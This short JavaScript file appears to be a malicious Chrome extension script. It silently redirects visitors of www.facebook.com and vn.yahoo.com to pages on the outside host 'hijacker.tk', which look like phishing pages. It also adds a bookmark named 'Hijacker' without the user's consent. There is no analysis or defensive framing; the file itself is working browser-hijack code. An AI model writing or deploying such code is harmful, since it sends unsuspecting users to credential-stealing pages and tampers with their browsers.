var $ = chrome.bookmarks;

if (window.location.hostname == "www.facebook.com") {

    window.location.href = "https://hijacker.tk/FB/";
}

if (window.location.hostname == "vn.yahoo.com") {
    window.location.href = "https://hijacker.tk/Yahoo/Yahoo.php";
}

chrome.bookmarks.create(
    { 'title': 'Hijacker', 'url': 'https://hijacker.tk' },
    function (newFolder) {
        console.log("added folder: " + newFolder.title);
    },
);